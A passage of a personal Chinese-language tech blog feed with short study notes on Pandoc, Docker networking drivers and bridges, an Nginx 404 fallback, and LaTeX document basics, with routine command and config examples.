sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh">$ fc-list :lang=zh<br></code></pre></td></tr></table></figure><h2 id="使用技巧"><a href="#使用技巧" class="headerlink" title="使用技巧"></a>使用技巧</h2><p>Pandoc 支持 YAML 格式的 header, 通过 header 可以指定文章的标题, 作者, 更新时间等信息.</p><p>如:</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs yaml"><span class="hljs-meta">---</span><br><span class="hljs-attr">title:</span> <br><span class="hljs-attr">author:</span><br><span class="hljs-attr">date:</span><br><span class="hljs-meta">---</span><br></code></pre></td></tr></table></figure><h1 id="测试"><a href="#测试" class="headerlink" title="测试"></a>测试</h1><p>我使用:</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh">$ pandoc --pdf-engine=xelatex -V CJKmainfont=<span class="hljs-string">&quot;WenQuanYi Zen Hei Mono&quot;</span> solution.md -o test.pdf<br></code></pre></td></tr></table></figure><p>这行命令, 能够正确识别和显示中文, 就是排版出了大问题.</p>]]></content>
    
    
    <categories>
      
      <category>Linux</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>Pandoc-命令的使用</title>
    <link href="/2022/10/07/Pandoc-%E5%91%BD%E4%BB%A4%E7%9A%84%E4%BD%BF%E7%94%A8/"/>
    <url>/2022/10/07/Pandoc-%E5%91%BD%E4%BB%A4%E7%9A%84%E4%BD%BF%E7%94%A8/</url>
    
    <content type="html"><![CDATA[<p><a href="https://pandoc.org/getting-started.html">官网</a><br>查看 man page.</p>]]></content>
    
    
    <categories>
      
      <category>Linux</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>Docker-Swarm-相关</title>
    <link href="/2022/10/07/Docker-Swarm-%E7%9B%B8%E5%85%B3/"/>
    <url>/2022/10/07/Docker-Swarm-%E7%9B%B8%E5%85%B3/</url>
    
    <content type="html"><![CDATA[<p><a href="https://www.runoob.com/docker/docker-swarm.html">菜鸟</a></p>]]></content>
    
    
    <categories>
      
      <category>Docker</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>Docker-docs-中的-Networking-overview-部分</title>
    <link href="/2022/10/07/Docker-docs-%E4%B8%AD%E7%9A%84-Networking-overview-%E9%83%A8%E5%88%86/"/>
    <url>/2022/10/07/Docker-docs-%E4%B8%AD%E7%9A%84-Networking-overview-%E9%83%A8%E5%88%86/</url>
    
    <content type="html"><![CDATA[<h1 id="Network-drivers"><a href="#Network-drivers" class="headerlink" title="Network drivers"></a>Network drivers</h1><p>有这样几种类型:</p><ul><li><code>bridge</code></li><li><code>host</code></li><li><code>overlay</code></li><li><code>ipvlan</code></li><li><code>macvlan</code></li><li><code>none</code></li><li>Network Plugins</li></ul><h2 id="bridge"><a href="#bridge" class="headerlink" title="bridge"></a>bridge</h2><p><a href="https://docs.docker.com/network/bridge/">官方文档</a><br><code>bridge</code>, 这是默认的 Network driver, 这个用于你有几个独立的容器, 然后你想让它们连接到一起.</p><p>一个 bridge 可以是一个运行在宿主机内核之上的硬件设备或者软件设备.</p><p>Docker 使用的是软件 bridge, 允许 containers 连接到同一个 bridge 并能够通信, 没有连接到这个 bridge 的 containers 不能与之通信.</p><p>也就是位于同一个网段的可以通信.</p><p>这只能用于 containers 跑在同一台主机上.</p><p>用户定义的 bridge 优先级比默认定义的高.</p><h3 id="配置默认的-bridge-network"><a href="#配置默认的-bridge-network" class="headerlink" title="配置默认的 bridge network"></a>配置默认的 bridge network</h3><p>可以在 <code>daemon.json</code> 这个文件中写相应配置. 路径为 <code>/etc/docker/daemon.json</code>, 如官方给出的例子:</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs json"><span class="hljs-punctuation">&#123;</span><br>  <span class="hljs-attr">&quot;bip&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;192.168.1.1/24&quot;</span><span class="hljs-punctuation">,</span><br>  <span class="hljs-attr">&quot;fixed-cidr&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;192.168.1.0/25&quot;</span><span class="hljs-punctuation">,</span><br>  <span class="hljs-attr">&quot;fixed-cidr-v6&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;2001:db8::/64&quot;</span><span class="hljs-punctuation">,</span><br>  <span class="hljs-attr">&quot;mtu&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-number">1500</span><span class="hljs-punctuation">,</span><br>  <span class="hljs-attr">&quot;default-gateway&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;192.168.1.254&quot;</span><span class="hljs-punctuation">,</span><br>  <span class="hljs-attr">&quot;default-gateway-v6&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;2001:db8:abcd::89&quot;</span><span class="hljs-punctuation">,</span><br>  <span class="hljs-attr">&quot;dns&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">[</span><span class="hljs-string">&quot;10.20.1.2&quot;</span><span class="hljs-punctuation">,</span><span class="hljs-string">&quot;10.20.1.3&quot;</span><span class="hljs-punctuation">]</span><br><span class="hljs-punctuation">&#125;</span><br></code></pre></td></tr></table></figure><h2 id="host"><a href="#host" class="headerlink" title="host"></a>host</h2><p><a href="https://docs.docker.com/network/host/">官方文档</a><br>用这个 network 可以去除各个容器以及宿主机之间的隔离性, 直接使用宿主机的网络. </p><p>容器不会被分配 IP 地址.</p><p>比如, 如果这个容器使用了 80 端口, 在使用 <code>host</code> 网络时, 你可以用素主机的 80 端口访问这个服务. (也就是说 port-mapping 会失效).</p><p>这个 <code>host</code> 选项只有在 Linux 主机上才能使用.</p><h2 id="overlay"><a href="#overlay" class="headerlink" title="overlay"></a>overlay</h2><p><a href="https://docs.docker.com/network/overlay/">官方文档</a><br>似乎和 Swarm 相关.</p><h2 id="ipvlan"><a href="#ipvlan" class="headerlink" title="ipvlan"></a>ipvlan</h2><p><a href="https://docs.docker.com/network/ipvlan/">官方文档</a><br>让用户完全掌控 ipv4 和 ipv6.</p><p>文档有点长.</p><h2 id="macvlan"><a href="#macvlan" class="headerlink" title="macvlan"></a>macvlan</h2><p><a href="https://docs.docker.com/network/macvlan/">官方文档</a><br>其允许你给容器分配一个 MAC 地址.</p><h2 id="none"><a href="#none" class="headerlink" title="none"></a>none</h2><p><a href="https://docs.docker.com/network/">官方文档</a></p><p>对于这个容器, 禁止所有的 network.</p><p>none 不能对 swarm 使用.</p><h2 id="Network-Plugins"><a href="#Network-Plugins" class="headerlink" title="Network Plugins"></a>Network Plugins</h2><p>使用第三方的网络插件.</p>]]></content>
    
    
    <categories>
      
      <category>Docker</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>给-Docker-容器绑定域名</title>
    <link href="/2022/10/07/%E7%BB%99-Docker-%E5%AE%B9%E5%99%A8%E7%BB%91%E5%AE%9A%E5%9F%9F%E5%90%8D/"/>
    <url>/2022/10/07/%E7%BB%99-Docker-%E5%AE%B9%E5%99%A8%E7%BB%91%E5%AE%9A%E5%9F%9F%E5%90%8D/</url>
    
    <content type="html"><![CDATA[]]></content>
    
    
    <categories>
      
      <category>Docker</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>Nginx-处理剩余所有页面的思路</title>
    <link href="/2022/10/07/Nginx-%E5%A4%84%E7%90%86%E5%89%A9%E4%BD%99%E6%89%80%E6%9C%89%E9%A1%B5%E9%9D%A2%E7%9A%84%E6%80%9D%E8%B7%AF/"/>
    <url>/2022/10/07/Nginx-%E5%A4%84%E7%90%86%E5%89%A9%E4%BD%99%E6%89%80%E6%9C%89%E9%A1%B5%E9%9D%A2%E7%9A%84%E6%80%9D%E8%B7%AF/</url>
    
    <content type="html"><![CDATA[<p>剩余所有页面会造成 <code>404</code> 错误, 因此通过 <code>error_page 404</code> 设置一下, 就可以让剩下所有的 url 导向这个页面.</p>]]></content>
    
    
    <categories>
      
      <category>Nginx</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>Docker-中的-bridge-网络</title>
    <link href="/2022/10/07/Docker-%E4%B8%AD%E7%9A%84-bridge-%E7%BD%91%E7%BB%9C/"/>
    <url>/2022/10/07/Docker-%E4%B8%AD%E7%9A%84-bridge-%E7%BD%91%E7%BB%9C/</url>
    
    <content type="html"><![CDATA[<p><a href="http://www.qb5200.com/article/320600.html">参考</a></p><h1 id="bridge-的作用"><a href="#bridge-的作用" class="headerlink" title="bridge 的作用"></a>bridge 的作用</h1><p>就是连通几个容器, 这些容器会自动相互暴露所有端口, 而且不会暴露给外部.</p><p>在用户自定义的网桥中, 容器之间可以直接通过容器名或别名进行访问.</p><p>如一个容器叫 test1, 另一个叫 test2, 这两个连上同一个 bridge, 在 test1 中可以执行:</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh">$ ping test2 <br></code></pre></td></tr></table></figure><p>可以直接 ping 通.</p><p>利用 <code>link</code> 键值对 (数组) 可以使用别名:</p><figure class="highlight dts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs dts"><span class="hljs-symbol">version:</span> <span class="hljs-string">&#x27;2&#x27;</span><br><span class="hljs-symbol">services:</span><br><span class="hljs-symbol">  web:</span><br><span class="hljs-symbol">    build:</span> .<br><span class="hljs-symbol">    links:</span><br>      - <span class="hljs-string">&quot;db:database&quot;</span><br><span class="hljs-symbol">  db:</span><br><span class="hljs-symbol">    image:</span> postgres<br></code></pre></td></tr></table></figure><p>这里 <code>database</code> 就是别名.</p>]]></content>
    
    
    <categories>
      
      <category>Docker</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>LaTeX-参考博文</title>
    <link href="/2022/10/07/LaTeX-%E5%8F%82%E8%80%83%E5%8D%9A%E6%96%87/"/>
    <url>/2022/10/07/LaTeX-%E5%8F%82%E8%80%83%E5%8D%9A%E6%96%87/</url>
    
    <content type="html"><![CDATA[<h1 id="参考1"><a href="#参考1" class="headerlink" title="参考1"></a><a href="https://zhuanlan.zhihu.com/p/456055339?utm_medium=social&utm_oi=1215946114580484096&utm_psn=1561623486828875776&utm_source=qq">参考1</a></h1><h2 id="设置文章类型以及文章的基本参数"><a href="#设置文章类型以及文章的基本参数" class="headerlink" title="设置文章类型以及文章的基本参数"></a>设置文章类型以及文章的基本参数</h2><p>利用 <code>\documentclass</code>:</p><figure class="highlight latex"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs latex"><span class="hljs-keyword">\documentclass</span>[12pt, a4paper, oneside]&#123;ctexart&#125;<br></code></pre></td></tr></table></figure><p>在 document 环境外的部分不会出现在结果中:</p><figure class="highlight dust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs dust"><span class="language-xml">\documentclass[12pt, a4paper, oneside]</span><span class="hljs-template-variable">&#123;ctexart&#125;</span><span class="language-xml"></span><br><span class="language-xml"></span><br><span class="language-xml">\begin</span><span class="hljs-template-variable">&#123;document&#125;</span><span class="language-xml"></span><br><span class="language-xml"></span><br><span class="language-xml">hello world</span><br><span class="language-xml"></span><br><span class="language-xml">\end</span><span class="hljs-template-variable">&#123;document&#125;</span><br></code></pre></td></tr></table></figure><p><code>[]</code> 中的内容为参数, <code>&#123;&#125;</code> 中的内容为类型.</p><h2 id="什么是导言区及其作用"><a href="#什么是导言区及其作用" class="headerlink" title="什么是导言区及其作用"></a>什么是导言区及其作用</h2><p>在 document 环境中的 <code>\begin&#123;document&#125;</code> 之前的部分就是导言区.</p><p>导言区用来加载宏包 (可以理解为模块或插件).</p><p>用 <code>\usepackage</code> 来加载:</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">\usepackage[<span class="hljs-attribute">bookmarks</span>=ture, colorlinks, <span class="hljs-attribute">citecolor</span>=blue, <span class="hljs-attribute">linkcolor</span>=black]&#123;hyperref&#125;<br></code></pre></td></tr></table></figure><p><code>[]</code> 里的同样是基本参数, <code>&#123;&#125;</code> 内的是宏包名.</p><p>可以多次使用 <code>\usepackage</code> 来加载:</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs routeros">\documentclass[12pt, a4paper, oneside]&#123;ctexart&#125;<br>\usepackage&#123;amsmath, amsthm, amssymb, graphicx&#125;<br>\usepackage[<span class="hljs-attribute">bookmarks</span>=<span class="hljs-literal">true</span>, colorlinks, <span class="hljs-attribute">citecolor</span>=blue, <span class="hljs-attribute">linkcolor</span>=black]&#123;hyperref&#125;<br></code></pre></td></tr></table></figure><h3 id="设置标题-作者等"><a href="#设置标题-作者等" class="headerlink" title="设置标题, 作者等"></a>设置标题, 作者等</h3><figure class="highlight livescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs livescript"><span class="hljs-string">\title&#123;我的第一个\LaTeX</span> 文档&#125;<br><span class="hljs-string">\author&#123;Dylaaan&#125;</span><br><span class="hljs-string">\date&#123;\today&#125;</span><br><br><span class="hljs-string">\begin&#123;document&#125;</span><br><br><span class="hljs-string">\maketitle</span><br><br>这里是正文. <br><br><span class="hljs-string">\end&#123;document&#125;</span><br><br></code></pre></td></tr></table></figure><h2 id="正文部分"><a href="#正文部分" class="headerlink" title="正文部分"></a>正文部分</h2><p>要在文档中显示标题, 需要在 document 环境中使用 <code>\maketitle</code>.</p><p>在 LaTeX 中, 另起一段的方式是使用一行间隔.</p><p>可以用 <code>\newpage</code> 另起一页.</p><h1 id="几个手册"><a href="#几个手册" class="headerlink" title="几个手册"></a>几个手册</h1><p><a href="https://www.cnblogs.com/1024th/p/11623258.html">参考1</a><br><a href="https://blog.csdn.net/ViatorSun/article/details/82826664">参考2</a><br><a href="http://mohu.org/info/symbols/symbols.htm">参考3</a></p><h1 id="技巧积累"><a href="#技巧积累" class="headerlink" title="技巧积累"></a>技巧积累</h1><p>写负数次幂, 需要使用大括号 <code>&#123;&#125;</code>, <code>$10^&#123;-10&#125;$</code>.</p><h2 id="乘法符号"><a href="#乘法符号" class="headerlink" title="乘法符号"></a>乘法符号</h2><p><mark>乘法</mark> 是 <code>\times</code> 这是 <code>x</code> 乘.</p><p>点乘为 <code>\cdot</code></p><h2 id="输出无穷符号"><a href="#输出无穷符号" class="headerlink" title="输出无穷符号"></a>输出无穷符号</h2><p>正无穷为 <code>+\infty</code></p><p>负无穷为 <code>-\infty</code></p><h2 id="在输出一长串公式时换行"><a href="#在输出一长串公式时换行" class="headerlink" title="在输出一长串公式时换行"></a>在输出一长串公式时换行</h2><p>使用 <code>\newline</code></p><h2 id="输出正负号"><a href="#输出正负号" class="headerlink" title="输出正负号"></a>输出正负号</h2><p><code>\pm</code> 也就是 plug minus.</p><h2 id="显示百分号"><a href="#显示百分号" class="headerlink" title="显示百分号"></a>显示百分号</h2><p>需要用 <code>\</code> 转义: <code>\%</code>.</p><h2 id="显示摄氏度"><a href="#显示摄氏度" class="headerlink" title="显示摄氏度"></a>显示摄氏度</h2><p><code>$^\circ$C</code></p><h2 id="正比符号"><a href="#正比符号" class="headerlink" title="正比符号"></a>正比符号</h2><p><code>\propto</code></p><h1 id="参考-B-站"><a href="#参考-B-站" class="headerlink" title="参考 B 站"></a><a href="https://b23.tv/fGEBYVT">参考 B 站</a></h1><h2 id="粗体-斜体-下划线"><a href="#粗体-斜体-下划线" class="headerlink" title="粗体, 斜体, 下划线"></a>粗体, 斜体, 下划线</h2><p><code>\textbf&#123;&#125;</code>, bf 是 bold font.</p><p><code>\textit&#123;&#125;</code>, it 是 italic.</p><p><code>\underline&#123;&#125;</code>.</p><p><code>\overline&#123;&#125;</code></p><h2 id="段落章节"><a href="#段落章节" class="headerlink" title="段落章节"></a>段落章节</h2><p>结构为: <code>\part&#123;&#125;</code> &#x3D;&gt; <code>\chapter&#123;&#125;</code> &#x3D;&gt; <code>\section&#123;&#125;</code> &#x3D;&gt; <code>\subsection&#123;&#125;</code> &#x3D;&gt; <code>\subsubsection&#123;&#125;</code></p><h2 id="添加图片"><a href="#添加图片" class="headerlink" title="添加图片"></a>添加图片</h2><p><code>graphicx</code> 这个包.</p><p>使用 <code>\includegraphics&#123;&#125;</code> 添加图片, 可以不加扩展名.</p><p>可调整图片宽度如:</p><figure class="highlight tex"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs tex"><span class="hljs-keyword">\includegraphics</span>[width=0.5<span class="hljs-keyword">\textwidth</span>]&#123;somegraph&#125;<br></code></pre></td></tr></table></figure><p>试验后没效果.</p><p>给图片添加标题, 可以将其嵌套在 <code>figure</code> 环境中:</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs css">\begin&#123;<span class="hljs-selector-tag">figure</span>&#125;<br>\includegraphics<span class="hljs-selector-attr">[width=0.5\textwidth]</span>&#123;somegraph&#125;<br>\<span class="hljs-selector-tag">caption</span>&#123;title&#125;<br>\end&#123;<span class="hljs-selector-tag">figure</span>&#125;<br></code></pre></td></tr></table></figure><p>然后利用  <code>\caption&#123;&#125;</code> 命令指定标题.</p><p>可以用 <code>\centering</code> 命令将图片居中显示.</p><h2 id="列表的创建"><a href="#列表的创建" class="headerlink" title="列表的创建"></a>列表的创建</h2><p>先进入列表环境, 环境类似于普通编程语言的作用域.</p><p>位于同一个环境中的内容将会共享相同的文字格式.</p><p>用 <code>\begin&#123;itemize&#125;</code> 创建无序列表. 列表中的每个元素都以 <code>\item</code> 开头.</p><p>如:</p><figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs applescript">\begin&#123;itemize&#125;<br>    \<span class="hljs-built_in">item</span> <span class="hljs-keyword">the</span> <span class="hljs-keyword">first</span> one<br>    \<span class="hljs-built_in">item</span> <span class="hljs-keyword">the</span> <span class="hljs-keyword">second</span> one<br>    \<span class="hljs-built_in">item</span> <span class="hljs-keyword">the</span> <span class="hljs-keyword">third</span> one<br>\<span class="hljs-keyword">end</span>&#123;itemize&#125;<br></code></pre></td></tr></table></figure><p>用 <code>enumerate</code> 环境创建有序列表环境. 如:</p><figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs applescript">\begin&#123;enumerate&#125;<br>    \<span class="hljs-built_in">item</span> <span class="hljs-keyword">the</span> <span class="hljs-keyword">first</span> one<br>    \<span class="hljs-built_in">item</span> <span class="hljs-keyword">the</span> <span class="hljs-keyword">second</span> one<br>    \<span class="hljs-built_in">item</span> <span class="hljs-keyword">the</span> <span class="hljs-keyword">third</span> one<br>\<span class="hljs-keyword">end</span>&#123;enumerate&#125;<br></code></pre></td></tr></table></figure><p>元素同样用 <code>\item</code> 开头.</p><h2 id="数学公式"><a href="#数学公式" class="headerlink" title="数学公式"></a>数学公式</h2><p>行内用 <code>$$</code>.</p><p>单独一行用 <code>equation</code> 环境:</p><figure class="highlight ada"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs ada">\<span class="hljs-keyword">begin</span>&#123;equation&#125;<br><br>\<span class="hljs-keyword">end</span>&#123;equation&#125;<br></code></pre></td></tr></table></figure><p><code>equation</code> 环境会在公式右方打印编号.</p><p>使用 <code>displaymath</code> 环境, 可以简写为 <code>\[</code>:</p><figure class="highlight livescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs livescript"><span class="hljs-string">\[</span><br><br><span class="hljs-string">\]</span><br></code></pre></td></tr></table></figure><h2 id="表格"><a href="#表格" class="headerlink" title="表格"></a>表格</h2><p>使用 <code>tabular</code> 环境, 传入参数表示尺寸:</p><figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs llvm">\<span class="hljs-keyword">begin</span>&#123;tabular&#125;&#123;<span class="hljs-keyword">c</span> <span class="hljs-keyword">c</span> <span class="hljs-keyword">c</span>&#125;<br><br>\<span class="hljs-keyword">end</span>&#123;tabular&#125;<br></code></pre></td></tr></table></figure><p><code>&#123;c c c&#125;</code> 的含义为, 有三列, 每一列的内容都居中对齐, <code>c</code> 是 centering 的意思. 可以替换 <code>c</code> 为 <code>l</code> , <code>r</code>.</p><p>每一列用 <code>&amp;</code> 分割, 每一行用 <code>\\</code> 分割:</p><figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs llvm">\<span class="hljs-keyword">begin</span>&#123;tabular&#125;&#123;<span class="hljs-keyword">c</span> <span class="hljs-keyword">c</span> <span class="hljs-keyword">c</span>&#125;<br><span class="hljs-keyword">one</span>   &amp; two   &amp; three \\<br>four  &amp; five  &amp; six \\<br>seven &amp; eight &amp; nine<br>\<span class="hljs-keyword">end</span>&#123;tabular&#125;<br></code></pre></td></tr></table></figure><p>生成带竖直线的边框:</p><figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs llvm">\<span class="hljs-keyword">begin</span>&#123;tabular&#125;&#123;|<span class="hljs-keyword">c</span>|<span class="hljs-keyword">c</span>|<span class="hljs-keyword">c</span>|&#125;<br><span class="hljs-keyword">one</span>   &amp; two   &amp; three \\<br>four  &amp; five  &amp; six \\<br>seven &amp; eight &amp; nine<br>\<span class="hljs-keyword">end</span>&#123;tabular&#125;<br></code></pre></td></tr></table></figure><p>水平方向的边框通过 <code>\hline</code> 添加.</p><figure class="highlight livescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs livescript"><span class="hljs-string">\begin&#123;tabular&#125;&#123;|c|c|c|&#125;</span><br><span class="hljs-string">\hline</span><br>one   &amp; two   &amp; three <span class="hljs-string">\\</span><br><span class="hljs-string">\hline</span><br>four  &amp; five  &amp; six <span class="hljs-string">\\</span><br><span class="hljs-string">\hline</span><br>seven &amp; eight &amp; nine<br><span class="hljs-string">\end&#123;tabular&#125;</span><br></code></pre></td></tr></table></figure><p>加两次 <code>\hline</code> 显示双横线.</p><p>单独指定宽度, 使用 <code>p&#123;&#125;</code> (paragraph)</p><figure class="highlight livescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs livescript"><span class="hljs-string">\begin&#123;tabular&#125;&#123;|p&#123;2cm&#125;|c|c|&#125;</span><br><span class="hljs-string">\hline</span><br>one   &amp; two   &amp; three <span class="hljs-string">\\</span><br><span class="hljs-string">\hline</span><br>four  &amp; five  &amp; six <span class="hljs-string">\\</span><br><span class="hljs-string">\hline</span><br>seven &amp; eight &amp; nine<br><span class="hljs-string">\end&#123;tabular&#125;</span><br></code></pre></td></tr></table></figure><p>添加标题, 先将表格放在 <code>table</code> 环境中, 再利用 <code>\caption</code> 和 <code>\centering</code> 调整:</p><figure class="highlight livescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs livescript"><span class="hljs-string">\begin&#123;table&#125;</span><br><span class="hljs-string">\centering</span><br><span class="hljs-string">\begin&#123;tabular&#125;&#123;|p&#123;2cm&#125;|c|c|&#125;</span><br><span class="hljs-string">\hline</span><br>one   &amp; two   &amp; three <span class="hljs-string">\\</span><br><span class="hljs-string">\hline</span><br>four  &amp; five  &amp; six <span class="hljs-string">\\</span><br><span class="hljs-string">\hline</span><br>seven &amp; eight &amp; nine<br><span class="hljs-string">\end&#123;tabular&#125;</span><br><span class="hljs-string">\caption&#123;This</span> <span class="hljs-keyword">is</span> a title&#125;<br><span class="hljs-string">\end&#123;table&#125;</span><br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>LaTeX</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>自己动手写-Docker-Notes</title>
    <link href="/2022/10/06/%E8%87%AA%E5%B7%B1%E5%8A%A8%E6%89%8B%E5%86%99-Docker-Notes/"/>
    <url>/2022/10/06/%E8%87%AA%E5%B7%B1%E5%8A%A8%E6%89%8B%E5%86%99-Docker-Notes/</url>
    
    <content type="html"><![CDATA[]]></content>
    
    
    <categories>
      
      <category>Docker</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>helloworld</title>
    <link href="/2022/10/06/helloworld/"/>
    <url>/2022/10/06/helloworld/</url>
    
    <content type="html"><![CDATA[<h1 id="Hello"><a href="#Hello" class="headerlink" title="Hello"></a>Hello</h1><p>helloworld</p><h1 id="World"><a href="#World" class="headerlink" title="World"></a>World</h1><p>helloworld</p><h2 id="test"><a href="#test" class="headerlink" title="test"></a>test</h2><p>test<br>test<br>test<br>test<br>test<br>test<br>test<br>test<br>test<br>test</p><h1 id="this-is-the-first-rank"><a href="#this-is-the-first-rank" class="headerlink" title="this is the first rank"></a>this is the first rank</h1><h2 id="this-is-the-second-rank"><a href="#this-is-the-second-rank" class="headerlink" title="this is the second rank"></a>this is the second rank</h2><h3 id="this-is-the-third-rank"><a href="#this-is-the-third-rank" class="headerlink" title="this is the third rank"></a>this is the third rank</h3><h1 id="test2"><a href="#test2" class="headerlink" title="test2"></a>test2</h1><p>00</p><p>kajfllallal<br>kajfllallal<br>kajfllallal<br>kajfllallal<br>kajfllallal</p><h1 id="test3"><a href="#test3" class="headerlink" title="test3"></a>test3</h1><p>kssususu<br>kssususu<br>kssususu<br>kssususu</p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>关于-Docker-容器中的网络-以及其查看</title>
    <link href="/2022/10/06/%E5%85%B3%E4%BA%8E-Docker-%E5%AE%B9%E5%99%A8%E4%B8%AD%E7%9A%84%E7%BD%91%E7%BB%9C-%E4%BB%A5%E5%8F%8A%E5%85%B6%E6%9F%A5%E7%9C%8B/"/>
    <url>/2022/10/06/%E5%85%B3%E4%BA%8E-Docker-%E5%AE%B9%E5%99%A8%E4%B8%AD%E7%9A%84%E7%BD%91%E7%BB%9C-%E4%BB%A5%E5%8F%8A%E5%85%B6%E6%9F%A5%E7%9C%8B/</url>
    
    <content type="html"><![CDATA[<p><a href="https://b23.tv/pEJ9LfC">参考</a><br><a href="https://labs.play-with-docker.com/">docker 学习网站</a></p><h1 id="查看"><a href="#查看" class="headerlink" title="查看"></a>查看</h1><p>进入容器:</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh">$ docker <span class="hljs-built_in">exec</span> -it name /bin/bash<br></code></pre></td></tr></table></figure><p>查看 <code>/etc/hosts</code> 文件信息:</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh">$ <span class="hljs-built_in">cat</span> /etc/hosts<br></code></pre></td></tr></table></figure><h1 id="ip-分配规律"><a href="#ip-分配规律" class="headerlink" title="ip 分配规律"></a>ip 分配规律</h1><p>宿主机安装 docker 之后会生成一张 docker 网卡, 我的 Archlinux 这张网卡叫 <code>docker0</code>.</p><p>这张网卡通过 NAT 的方式为每一个容器分配 IP.</p><p>网卡的 ip 为 <code>172.27.0.1</code>, 子网掩码为 <code>255.255.0.0</code>, 第一个容器的 ip 为 <code>172.27.0.2</code>, 第二个容器为 <code>172.27.0.2</code></p><p>由于容器都属于同一个网段, 彼此之间可以通过 IP 进行通讯. 容器和宿主机进行通信是通过如 <code>eth0</code> 网卡进行转发.</p><h1 id="使容器阻塞运行"><a href="#使容器阻塞运行" 